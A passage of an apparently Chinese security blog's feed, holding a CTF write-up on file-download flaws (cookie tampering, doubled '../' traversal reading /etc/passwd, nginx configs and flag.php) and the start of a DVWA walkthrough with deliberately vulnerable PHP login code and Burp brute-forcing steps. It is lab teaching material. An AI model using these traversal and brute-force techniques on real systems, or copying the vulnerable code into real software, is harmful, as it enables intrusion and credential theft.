class=\"line\">        &lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;servlet-class&gt;com.wm.ctf.IndexController&lt;/servlet-class&gt;</span><br><span class=\"line\">    &lt;/servlet&gt;</span><br><span class=\"line\">    &lt;servlet-mapping&gt;</span><br><span class=\"line\">        &lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;url-pattern&gt;/Index&lt;/url-pattern&gt;</span><br><span class=\"line\">    &lt;/servlet-mapping&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;servlet&gt;</span><br><span class=\"line\">        &lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;servlet-class&gt;com.wm.ctf.LoginController&lt;/servlet-class&gt;</span><br><span class=\"line\">    &lt;/servlet&gt;</span><br><span class=\"line\">    &lt;servlet-mapping&gt;</span><br><span class=\"line\">        &lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;url-pattern&gt;/Login&lt;/url-pattern&gt;</span><br><span class=\"line\">    &lt;/servlet-mapping&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;servlet&gt;</span><br><span class=\"line\">        &lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;servlet-class&gt;com.wm.ctf.DownloadController&lt;/servlet-class&gt;</span><br><span class=\"line\">    &lt;/servlet&gt;</span><br><span class=\"line\">    &lt;servlet-mapping&gt;</span><br><span class=\"line\">        &lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;url-pattern&gt;/Download&lt;/url-pattern&gt;</span><br><span class=\"line\">    &lt;/servlet-mapping&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;servlet&gt;</span><br><span class=\"line\">        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class=\"line\">    &lt;/servlet&gt;</span><br><span class=\"line\">    &lt;servlet-mapping&gt;</span><br><span class=\"line\">        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;</span><br><span class=\"line\">    &lt;/servlet-mapping&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/web-app&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>我们可以看到com.wm.FlagController，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;servlet&gt;</span><br><span class=\"line\">&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class=\"line\">&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class=\"line\">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure>\n<p>servlet-class里面的.代表的是路径/<br />\n然后下载FlagController.class文件试一试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>\n<p>打开文件发现一串base编码，进行base64解密得到flag</p>\n<p><img src=\"2021082316105438.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105438.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p><img src=\"2021082316105439.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105439.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p><a href=\"https://www.cnblogs.com/yanze/p/10457924.html\">资料1</a><br />\n<a href=\"https://www.runoob.com/servlet/servlet-tutorial.html\">资料2</a></p>\n<p><img src=\"2021082316105440.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105440.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<h3 id=\"百度杯2017二月-zone真题复现\"><a class=\"markdownIt-Anchor\" href=\"#百度杯2017二月-zone真题复现\"></a> 百度杯2017二月-Zone真题复现</h3>\n<p><a href=\"https://www.ichunqiu.com/battalion?t=1&amp;r=57475\">靶场</a><br />\n<a href=\"https://mayi077.gitee.io/2020/01/29/2017%E7%99%BE%E5%BA%A6%E6%9D%AF-%E4%BA%8C%E6%9C%88%E5%9C%BA-Zone/\">wp1</a><br />\n<a href=\"https://www.ichunqiu.com/writeup/detail/4941\">wp2</a></p>\n<p><img src=\"2021082316105441.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105441.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p>1、 尝试burp抓包发现cookie中有个login，值为0，将0改为1后在访问首页，发现可以正常登入</p>\n<p><img src=\"2021082316105442.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105442.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p>2、单击 “manage” （此时还是需要用burp改login的值），点击框框发现比较特殊的url；猜测可能存在文件包含或者下载、读取</p>\n<p><img src=\"2021082316105443.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105443.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p>3、测试访问url: <a href=\"http://xxxxxx.com/manages/admin.php?module=ind%E2%80%A6/ex&amp;name=php\">xxxxxx.com/manages/admin.php?module=ind…/ex&amp;name=php</a> 页面可以正常访问,猜测过滤了一遍…/再试一试绕过 url:url: <a href=\"http://xxxxxx.com/manages/admin.php?module=ind%E2%80%A6/./ex&amp;name=php\">xxxxxx.com/manages/admin.php?module=ind…/./ex&amp;name=php</a> 访问不正常；<br />\n说明过滤机制只是把…/进行了一次过滤，所以我们双写…/即可</p>\n<p>4、访问测试任意文件读取判断路径通过不断加…/ url:?module=…/./…/./…/./etc/passwd&amp;name<br />\n（用户情况文件）</p>\n<p><img src=\"2021082316105544.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105544.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p>5、查看下服务器是nginx。找一下它的配置文件，根据信息读取配置文件， url: manages/admin.php?module=…/./…/./…/./etc/nginx/nginx.conf 获得关键文件sites-enabled/default 并进行读取</p>\n<p><img src=\"2021082316105545.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105545.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p>module=…/./…/./…/./etc/nginx/sites-enabled/default&amp;name=获得web文件路径online-movies 并访问</p>\n<p><img src=\"2021082316105546.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105546.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p>6、发现可以利用的漏洞，因为有一个autoindex on也就是开启了目录遍历，我们可以访问这个/online-movies/，访问出现如下，再点击…/发现要进行验证，把login改为1后页面空白，我通过百度发现要/online-movies/…才能遍历（不清楚为什么）</p>\n<p><img src=\"2021082316105547.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105547.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p>7、访问/online-movies…/</p>\n<p><img src=\"2021082316105548.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105548.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p>8、地址为:online-movies…/var/www/html/flag.php构造url下载到flag.php获得flag</p>\n<p>到此这篇关于案例讲解WEB 漏洞-文件操作之文件下载读取的文章就介绍到这了,更多相关WEB 漏洞文件下载读取内容请搜索脚本之家以前的文章或继续浏览下面的相关文章希望大家以后多多支持脚本之家！</p>\n",
            "tags": [
                "安全"
            ]
        },
        {
            "id": "http://example.com/2021/04/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA/",
            "url": "http://example.com/2021/04/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA/",
            "title": "DVWA通关手册",
            "date_published": "2021-04-15T03:40:59.000Z",
            "content_html": "<h1 id=\"dvwa通关手册\"><a class=\"markdownIt-Anchor\" href=\"#dvwa通关手册\"></a> DVWA通关手册</h1>\n<h2 id=\"brute-force\"><a class=\"markdownIt-Anchor\" href=\"#brute-force\"></a> Brute Force</h2>\n<p>登录界面</p>\n<h2 id=\"image-20210425163130153\"><a class=\"markdownIt-Anchor\" href=\"#image-20210425163130153\"></a> <img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163130153.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163130153.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425163130153\" /></h2>\n<h3 id=\"low\"><a class=\"markdownIt-Anchor\" href=\"#low\"></a> Low</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get username</span></span><br><span class=\"line\">    <span class=\"variable\">$user</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;username&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get password</span></span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = md5( <span class=\"variable\">$pass</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check the database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class=\"subst\">$user</span>&#x27; AND password = &#x27;<span class=\"subst\">$pass</span>&#x27;;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$result</span> &amp;&amp; mysqli_num_rows( <span class=\"variable\">$result</span> ) == <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Get users details</span></span><br><span class=\"line\">        <span class=\"variable\">$row</span>    = mysqli_fetch_assoc( <span class=\"variable\">$result</span> );</span><br><span class=\"line\">        <span class=\"variable\">$avatar</span> = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;avatar&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Login successful</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;p&gt;Welcome to the password protected area <span class=\"subst\">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;img src=\\&quot;<span class=\"subst\">&#123;$avatar&#125;</span>\\&quot; /&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Login failed</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ((is_null(<span class=\"variable\">$___mysqli_res</span> = mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>使用Burp Suit抓包</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163429574.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163429574.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425163429574\" /></p>\n</li>\n<li>\n<p>Send to intruder</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163500449.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163500449.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425163500449\" /></p>\n</li>\n<li>\n<p>选择密码位置</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163605602.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163605602.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425163605602\" /></p>\n</li>\n<li>\n<p>上字典</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425164245642.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425164245642.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425164245642\" /></p>\n</li>\n<li>\n<p>根据返回长度判断正确密码</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425171021802.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425171021802.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425171021802\" /></p>\n</li>\n</ul>\n<h3 id=\"medium\"><a class=\"markdownIt-Anchor\" href=\"#medium\"></a> Medium</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Sanitise username input</span></span><br><span class=\"line\">    <span class=\"variable\">$user</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;username&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$user</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$user</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitise password input</span></span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = md5( <span class=\"variable\">$pass</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check the database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class=\"subst\">$user</span>&#x27; AND password = &#x27;<span class=\"subst\">$pass</span>&#x27;;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$result</span> &amp;&amp; mysqli_num_rows( <span class=\"variable\">$result</span> ) == <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Get users details</span></span><br><span class=\"line\">        <span class=\"variable\">$row</span>    = mysqli_fetch_assoc( <span class=\"variable\">$result</span> );</span><br><span class=\"line\">        <span class=\"variable\">$avatar</span> = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;avatar&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Login successful</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;p&gt;Welcome to the password protected area <span class=\"subst\">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;img src=\\&quot;<span class=\"subst\">&#123;$avatar&#125;</span>\\&quot; /&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Login failed</span></span><br><span class=\"line\">        sleep( <span class=\"number\">2</span> );</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ((is_null(<span class=\"variable\">$___mysqli_res</span> = mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n<ul>\n<li>加入了参数的判断，防止部分SQL注入，加入sleep(2)</li>\n<li>没有防爆破机制，操作同Low等级</li>\n</ul>\n<h3 id=\"high\"><a class=\"markdownIt-Anchor\" href=\"#high\"></a> High</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitise username input</span></span><br><span class=\"line\">    <span class=\"variable\">$user</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;username&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$user</span> = stripslashes( <span class=\"variable\">$user</span> );</span><br><span class=\"line\">    <span class=\"variable\">$user</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$user</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitise password input</span></span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = stripslashes( <span class=\"variable\">$pass</span> );</span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = md5( <span class=\"variable\">$pass</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class=\"subst\">$user</span>&#x27; AND password = &#x27;<span class=\"subst\">$pass</span>&#x27;;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$result</span> &amp;&amp; mysqli_num_rows( <span class=\"variable\">$result</span> ) == <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Get users details</span></span><br><span class=\"line\">        <span class=\"variable\">$row</span>    = 